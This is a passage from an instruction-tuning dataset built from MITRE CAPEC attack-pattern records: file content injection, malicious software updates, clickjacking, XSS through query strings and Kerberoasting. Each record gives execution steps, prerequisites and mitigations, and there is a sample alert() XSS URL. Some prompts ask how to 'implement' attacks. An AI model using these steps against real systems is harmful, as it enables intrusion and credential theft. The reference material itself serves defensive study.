          "Example": "To an extent, Google services (such as Google Maps) are all well-known examples. Calling these services, or extending them for one's own (perhaps very different) purposes is as easy as knowing they exist. Their unencumbered public use, however, is a purposeful aspect of Google's business model. Most organizations, however, do not have the same business model. Organizations publishing services usually fall back on thoughts that Attackers \"will not know services exist\" and that \"even if they did, they wouldn't be able to access them because they're not on the local LAN.\" Simple threat modeling exercises usually uncovers simple attack vectors that can invalidate these assumptions."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "306"
            },
            {
              "@CWE_ID": "693"
            },
            {
              "@CWE_ID": "695"
            },
            {
              "@CWE_ID": "1242"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Attack_Phases, Attack_Prerequisites, Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated @Name, Description, Execution_Flow, Related_Attack_Patterns, Related_Weaknesses, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated @Name, Description, Execution_Flow, Extended_Description, Related_Attack_Patterns"
            }
          ],
          "Previous_Entry_Name": [
            {
              "@Date": "2015-12-07",
              "#text": "Using Unpublished Web Service APIs"
            },
            {
              "@Date": "2020-07-30",
              "#text": "Using Unpublished APIs"
            },
            {
              "@Date": "2022-09-29",
              "#text": "Using Unpublished Interfaces"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - File Content Injection (CAPEC ID: 23)",
    "context": "",
    "output": "PHP is a very popular language used for developing web applications. When PHP is used with global variables, a vulnerability may be opened that affects the file system. A standard HTML form that allows for remote users to upload files, may also place those files in a public directory where the adversary can directly access and execute them through a browser. This vulnerability allows remote adversaries to execute arbitrary code on the system, and can result in the adversary being able to erase intrusion evidence from system and application logs.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "PHP is a very popular language used for developing web applications. When PHP is used with global variables, a vulnerability may be opened that affects the file system. A standard HTML form that allows for remote users to upload files, may also place those files in a public directory where the adversary can directly access and execute them through a browser. This vulnerability allows remote adversaries to execute arbitrary code on the system, and can result in the adversary being able to erase intrusion evidence from system and application logs.",
      "@Name": "File Content Injection (CAPEC ID: 23)",
      "attack_ptrn": {
        "@ID": "23",
        "@Name": "File Content Injection",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary poisons files with a malicious payload (targeting the file systems accessible by the target software), which may be passed through by standard channels such as via email, and standard web content like PDF and multimedia files. The adversary exploits known vulnerabilities or handling routines in the target processes, in order to exploit the host's trust in executing remote content, including binary files.",
        "Extended_Description": {
          "xhtml:p": "Vulnerabilities of this type have been found in a wide variety of commercial applications from Microsoft Office to Adobe Acrobat and Apple Safari web browser. When the adversary knows the standard handling routines and can identify vulnerabilities and entry points, they can be exploited by otherwise seemingly normal content. Once the attack is executed, the adversary's program can access relative directories such as C:\\Program Files or other standard system directories to launch further attacks. In a worst case scenario, these programs are combined with other propagation logic and work as a virus."
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "242"
            },
            {
              "@Nature": "CanAlsoBe",
              "@CAPEC_ID": "165"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target software must consume files.",
            "The adversary must have access to modify files that the target software will consume."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "How to poison a file with malicious payload that will exploit a vulnerability when the file is opened. The adversary must also know how to place the file onto a system where it will be opened by an unsuspecting party, or force the file to be opened."
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Integrity",
              "Availability"
            ],
            "Impact": "Execute Unauthorized Commands",
            "Note": "Run Arbitrary Code"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Enforce principle of least privilege",
            "Design: Validate all input for content including files. Ensure that if files and remote content must be accepted that once accepted, they are placed in a sandbox type location so that lower assurance clients cannot write up to higher assurance processes (like Web server processes for example)",
            "Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.",
            "Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.",
            "Implementation: Virus scanning on host",
            "Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "PHP is a very popular language used for developing web applications. When PHP is used with global variables, a vulnerability may be opened that affects the file system. A standard HTML form that allows for remote users to upload files, may also place those files in a public directory where the adversary can directly access and execute them through a browser. This vulnerability allows remote adversaries to execute arbitrary code on the system, and can result in the adversary being able to erase intrusion evidence from system and application logs."
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "20"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Examples-Instances, Payload_Activation_Impact"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Example_Instances, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-12-07",
            "#text": "File System Function Injection, Content Based"
          }
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Malicious Manual Software Update (CAPEC ID: 533)",
    "context": "",
    "output": "Possible examples: An email campaign was initiated, targetting victims of a ransomware attack. The email claimed to be a patch to address the ransomware attack, but was instead an attachment that caused the Cobalt Strike tools to be installed, which enabled further attacks.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An email campaign was initiated, targetting victims of a ransomware attack. The email claimed to be a patch to address the ransomware attack, but was instead an attachment that caused the Cobalt Strike tools to be installed, which enabled further attacks.",
      "@Name": "Malicious Manual Software Update (CAPEC ID: 533)",
      "attack_ptrn": {
        "@ID": "533",
        "@Name": "Malicious Manual Software Update",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker introduces malicious code to the victim's system by altering the payload of a software update, allowing for additional compromise or site disruption at the victim location. These manual, or user-assisted attacks, vary from requiring the user to download and run an executable, to as streamlined as tricking the user to click a URL. Attacks which aim at penetrating a specific network infrastructure often rely upon secondary attack methods to achieve the desired impact. Spamming, for example, is a common method employed as an secondary attack vector. Thus the attacker has in their arsenal a choice of initial attack vectors ranging from traditional SMTP/POP/IMAP spamming and its varieties, to web-application mechanisms which commonly implement both chat and rich HTML messaging within the user interface.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "186"
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "Advanced knowledge about the download and update installation processes.",
            "Advanced knowledge about the deployed system and its various software subcomponents and processes."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Able to develop malicious code that can be used on the victim's system while maintaining normal functionality."
          }
        },
        "Mitigations": {
          "Mitigation": "Only accept software updates from an official source."
        },
        "Example_Instances": {
          "Example": "An email campaign was initiated, targetting victims of a ransomware attack. The email claimed to be a patch to address the ransomware attack, but was instead an attachment that caused the Cobalt Strike tools to be installed, which enabled further attacks."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "494"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-710"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, References, Related_Attack_Patterns, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Example_Instances, Mitigations, References"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-11-09",
            "#text": "Malicious Software Update"
          }
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Clickjacking (CAPEC ID: 103)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Clickjacking (CAPEC ID: 103) are: A victim has an authenticated session with a site that provides an electronic payment service to transfer funds between subscribing members. At the same time, the victim receives an e-mail that appears to come from an online publication to which they subscribe with links to today's news articles. The victim clicks on one of these links and is taken to a page with the news story. There is a screen with an advertisement that appears on top of the news article with the 'skip this ad' button. Eager to read the news article, the user clicks on this button. Nothing happens. The user clicks on the button one more time and still nothing happens.\nIn reality, the victim activated a hidden action control located in a transparent layer above the 'skip this ad' button. The ad screen blocking the news article made it likely that the victim would click on the 'skip this ad' button. Clicking on the button, actually initiated the transfer of $1000 from the victim's account with an electronic payment service to an adversary's account. Clicking on the 'skip this ad' button the second time (after nothing seemingly happened the first time) confirmed the transfer of funds to the electronic payment service.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "A victim has an authenticated session with a site that provides an electronic payment service to transfer funds between subscribing members. At the same time, the victim receives an e-mail that appears to come from an online publication to which they subscribe with links to today's news articles. The victim clicks on one of these links and is taken to a page with the news story. There is a screen with an advertisement that appears on top of the news article with the 'skip this ad' button. Eager to read the news article, the user clicks on this button. Nothing happens. The user clicks on the button one more time and still nothing happens.",
        "In reality, the victim activated a hidden action control located in a transparent layer above the 'skip this ad' button. The ad screen blocking the news article made it likely that the victim would click on the 'skip this ad' button. Clicking on the button, actually initiated the transfer of $1000 from the victim's account with an electronic payment service to an adversary's account. Clicking on the 'skip this ad' button the second time (after nothing seemingly happened the first time) confirmed the transfer of funds to the electronic payment service."
      ],
      "@Name": "Clickjacking (CAPEC ID: 103)",
      "attack_ptrn": {
        "@ID": "103",
        "@Name": "Clickjacking",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary tricks a victim into unknowingly initiating some action in one system while interacting with the UI from a seemingly completely different, usually an adversary controlled or intended, system.",
        "Extended_Description": {
          "xhtml:p": "While being logged in to some target system, the victim visits the adversary's malicious site which displays a UI that the victim wishes to interact with. In reality, the clickjacked page has a transparent layer above the visible UI with action controls that the adversary wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the adversary may have just tricked the victim into executing some potentially privileged (and most certainly undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks they are clicking on versus what they are actually clicking on."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "173"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "[Craft a clickjacking page] The adversary utilizes web page layering techniques to try to craft a malicious clickjacking page",
              "Technique": [
                "The adversary leveraged iframe overlay capabilities to craft a malicious clickjacking page",
                "The adversary leveraged Flash file overlay capabilities to craft a malicious clickjacking page",
                "The adversary leveraged Silverlight overlay capabilities to craft a malicious clickjacking page",
                "The adversary leveraged cross-frame scripting to craft a malicious clickjacking page"
              ]
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "[Adversary lures victim to clickjacking page] Adversary utilizes some form of temptation, misdirection or coercion to lure the victim to loading and interacting with the clickjacking page in a way that increases the chances that the victim will click in the right areas.",
              "Technique": [
                "Lure the victim to the malicious site by sending the victim an e-mail with a URL to the site.",
                "Lure the victim to the malicious site by manipulating URLs on a site trusted by the victim.",
                "Lure the victim to the malicious site through a cross-site scripting attack."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Trick victim into interacting with the clickjacking page in the desired manner] The adversary tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim's level of privilege.",
              "Technique": [
                "Hide action controls over very commonly used functionality.",
                "Hide action controls over very psychologically tempting content."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The victim is communicating with the target application via a web based UI and not a thick client",
            "The victim's browser security policies allow at least one of the following JavaScript, Flash, iFrames, ActiveX, or CSS.",
            "The victim uses a modern browser that supports UI elements like clickable buttons (i.e. not using an old text only browser)",
            "The victim has an active session with the target system.",
            "The target system's interaction window is open in the victim's browser and supports the ability for initiating sensitive actions on behalf of the user in the target system"
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Crafting the proper malicious site and luring the victim to this site are not trivial tasks."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames.",
            "Turn off JavaScript, Flash and disable CSS.",
            "When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "A victim has an authenticated session with a site that provides an electronic payment service to transfer funds between subscribing members. At the same time, the victim receives an e-mail that appears to come from an online publication to which they subscribe with links to today's news articles. The victim clicks on one of these links and is taken to a page with the news story. There is a screen with an advertisement that appears on top of the news article with the 'skip this ad' button. Eager to read the news article, the user clicks on this button. Nothing happens. The user clicks on the button one more time and still nothing happens.",
              "In reality, the victim activated a hidden action control located in a transparent layer above the 'skip this ad' button. The ad screen blocking the news article made it likely that the victim would click on the 'skip this ad' button. Clicking on the button, actually initiated the transfer of $1000 from the victim's account with an electronic payment service to an adversary's account. Clicking on the 'skip this ad' button the second time (after nothing seemingly happened the first time) confirmed the transfer of funds to the electronic payment service."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "1021"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "OWASP Attacks",
            "Entry_Name": "Clickjacking"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-619",
            "@Section": "Testing for Clickjacking"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Description Summary, Examples-Instances, Related_Weaknesses, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - XSS Through HTTP Query Strings (CAPEC ID: 32)",
    "context": "",
    "output": "Examples of XSS Through HTTP Query Strings (CAPEC ID: 32) are: http://user:host@example.com:8080/oradb<script>alert('Hi')</script>",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "http://user:host@example.com:8080/oradb<script>alert('Hi')</script>"
      ],
      "@Name": "XSS Through HTTP Query Strings (CAPEC ID: 32)",
      "attack_ptrn": {
        "@ID": "32",
        "@Name": "XSS Through HTTP Query Strings",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary embeds malicious script code in the parameters of an HTTP query string and convinces a victim to submit the HTTP request that contains the query string to a vulnerable web application. The web application then procedes to use the values parameters without properly validation them first and generates the HTML code that will be executed by the victim's browser.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "591"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "588"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "592"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the application for public links] Using a browser or an automated tool, an adversary follows all public links on a web site. They record all the links they find.",
              "Technique": [
                "Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.",
                "Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Probe public links for XSS vulnerability] The adversary uses the public links gathered in the \"Explore\" phase as a target list and requests variations on the URLs they spidered before. They send parameters that include variations of payloads. They record all the responses from the server that include unmodified versions of their script.",
              "Technique": [
                "Use a list of XSS probe strings to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier.",
                "Use a proxy tool to record results of manual input of XSS probes in known URLs."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.",
              "Technique": [
                "Change a URL parameter to include a malicious script tag.",
                "Send information gathered from the malicious script to a remote endpoint."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.",
              "Technique": [
                "Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.",
                "Put the malicious URL on a public forum, where many victims might accidentally click the link."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Target client software must allow scripting such as JavaScript. Server software must allow display of remote generated HTML without sufficient input or output validation."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "To place malicious payload on server via HTTP"
            },
            {
              "@Level": "High",
              "#text": "Exploiting any information gathered by HTTP Query on script host"
            }
          ]
        },
        "Resources_Required": {
          "Resource": "Ability to send HTTP post to scripting host and collect output"
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Use browser technologies that do not allow client side scripting.",
            "Design: Utilize strict type, character, and encoding enforcement",
            "Design: Server side developers should not proxy content via XHR or other means, if a http proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.",
            "Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.",
            "Implementation: Perform input validation for all remote content, including remote and user-generated content",
            "Implementation: Perform output validation for all remote content.",
            "Implementation: Disable scripting languages such as JavaScript in browser",
            "Implementation: Session tokens for specific host",
            "Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.",
            "Implementation: Privileges are constrained, if a script is loaded, ensure system runs in chroot jail or other limited authority mode"
          ]
        },
        "Example_Instances": {
          "Example": [
            "http://user:host@example.com:8080/oradb<script>alert('Hi')</script>",
            {
              "xhtml:p": [
                "Web applications that accept name value pairs in a HTTP Query string are inherently at risk to any value (or name for that matter) that an adversary would like to enter in the query string. This can be done manually via web browser or trivially scripted to post the query string to multiple sites. In the latter case, in the instance of many sites using similar infrastructure with predictable http queries being accepted and operated on (such as blogging software, Google applications, and so on), a single malicious payload can be scripted to target a wide variety of sites.",
                "Web 2.0 type sites like Technorati and del.icio.us rely on user generated content like tags to build http links that are displayed to other users. del.icio.us allows users to identify sites, tag them with metadata and provide URL, descriptions and more data. This data is then echoed back to any other web browser that is interested in the link. If the data is not validated by the del.icio.us site properly then an arbitrary code can be added into the standard http string sent to del.icio.us by the adversary, for example formatted as normal content with a URL and description and tagged as Java, and available to be clicked on (and executed by) any user browsing for Java content that clicks on this trojaned content."
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "80"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Phases, Description Summary, Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-05-01",
            "#text": "Embedding Scripts in HTTP Query Strings"
          }
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Kerberoasting (CAPEC ID: 509)",
    "context": "",
    "output": "Possible examples: PowerSploit's Invoke-Kerberoast module can be leveraged to request Ticket Granting Service (TGS) tickets and return crackable ticket hashes. [REF-585] [REF-586]",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "PowerSploit's Invoke-Kerberoast module can be leveraged to request Ticket Granting Service (TGS) tickets and return crackable ticket hashes. [REF-585] [REF-586]",
      "@Name": "Kerberoasting (CAPEC ID: 509)",
      "attack_ptrn": {
        "@ID": "509",
        "@Name": "Kerberoasting",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "Through the exploitation of how service accounts leverage Kerberos authentication with Service Principal Names (SPNs), the adversary obtains and subsequently cracks the hashed credentials of a service account target to exploit its privileges. The Kerberos authentication protocol centers around a ticketing system which is used to request/grant access to services and to then access the requested services. As an authenticated user, the adversary may request Active Directory and obtain a service ticket with portions encrypted via RC4 with the private key of the authenticated account. By extracting the local ticket and saving it disk, the adversary can brute force the hashed value to reveal the target account credentials.",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "652"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "151"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "Scan for user accounts with set SPN values",
              "Technique": "These can be found via Powershell or LDAP queries, as well as enumerating startup name accounts and other means."
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "Request service tickets",
              "Technique": "Using user account's SPN value, request other service tickets from Active Directory"
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "Extract ticket and save to disk",
              "Technique": "Certain tools like Mimikatz can extract local tickets and save them to memory/disk."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "Crack the encrypted ticket to harvest plain text credentials",
              "Technique": "Leverage a brute force application/script on the hashed value offline until cracked. The shorter the password, the easier it is to crack."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The adversary requires access as an authenticated user on the system. This attack pattern relates to elevating privileges.",
            "The adversary requires use of a third-party credential harvesting tool (e.g., Mimikatz).",
            "The adversary requires a brute force tool."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium"
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Gain Privileges"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Monitor system and domain logs for abnormal access.",
            "Employ a robust password policy for service accounts. Passwords should be of adequate length and complexity, and they should expire after a period of time.",
            "Employ the principle of least privilege: limit service accounts privileges to what is required for functionality and no more.",
            "Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible."
          ]
        },
        "Example_Instances": {
          "Example": "PowerSploit's Invoke-Kerberoast module can be leveraged to request Ticket Granting Service (TGS) tickets and return crackable ticket hashes. [REF-585] [REF-586]"
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "522"
            },
            {
              "@CWE_ID": "308"
            },
            {
              "@CWE_ID": "309"
            },
            {
              "@CWE_ID": "294"
            },
            {
              "@CWE_ID": "263"
            },
            {
              "@CWE_ID": "262"
            },
            {
              "@CWE_ID": "521"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1558.003",
            "Entry_Name": "Steal or Forge Kerberos Tickets:Kerberoasting"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-559"
            },
            {
              "@External_Reference_ID": "REF-585"
            },
            {
              "@External_Reference_ID": "REF-586"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
